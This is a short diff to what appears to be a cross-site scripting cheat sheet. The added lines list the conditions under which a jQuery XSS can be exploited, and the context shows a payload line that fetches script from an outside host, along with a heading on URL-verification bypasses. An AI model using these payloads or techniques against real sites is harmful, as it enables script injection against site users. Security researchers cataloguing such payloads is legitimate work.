@@ -40,6 +40,11 @@ Note: This kind of depends on what security level the application is set to. See
 $.get('http://sakurity.com/jqueryxss')
 ```
 
+In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:
+
+1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
+2) Find any requests to trusted API endpoints where script can be injected into data sources.
+
 **URL verification bypasses (works without `&#x09;` too)**
 
 ```
